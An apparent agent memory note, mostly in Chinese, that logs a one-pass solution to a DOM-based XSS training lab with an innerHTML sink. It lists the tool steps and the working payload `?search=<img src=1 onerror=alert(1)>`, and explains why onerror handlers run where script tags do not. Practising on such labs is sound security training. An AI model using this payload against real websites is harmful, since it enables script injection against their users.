---
metadata:
  node_type: memory
name: "PRS arm A lab-innerhtml-sink"
description: "arm A 基线:lab-innerhtml-sink 冷实例一次通过 - ?search=<img src=1 onerror=alert(1)> 触发 innerHTML sink,page_alert fired + banner solved"
last_updated: 2026-10-09T01:10:20+08:00
created: 2026-10-09T01:10:20+08:00
---

## 2026-10-09 arm A: lab-innerhtml-sink

- 题: `/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink`(DOM XSS,innerHTML sink 吃 location.search)。
- 链(4 步,一次通过):
  1. `page_read` 该路径 → lab_id `643E053E185D7855C6C7EA780BB082FA545FDD40E72AABC79F1742EB2AD07914`(200,无 404)。
  2. `range_launch launch-url <该路径> --jar /tmp/cj1.json` → 实例 `https://0ad200c2045ae5c98117caa000d70081.web-security-academy.net/`,reused:false(新实例)。
  3. `page_alert 'https://<实例>/?search=<img src=1 onerror=alert(1)>'` → fired=true,alerts `["alert:1"]`。
  4. `banner_verdict <实例根> --jar /tmp/cj1.json` → solved=true,congrats `Congratulations, you solved the lab!`。
- 判据:innerHTML 不跑 `<script>`,但 `onerror` 内联事件处理器在解析注入标签时执行 → `<img src=1 onerror=alert(1)>` 即触发;query 原样进 sink,无需编码处理(HTTP 库自动百分号编码也不妨碍)。
- 坑:无。launch-url 免 page_read 取号但本次仍先 page_read 取到 lab_id,两条路都通。

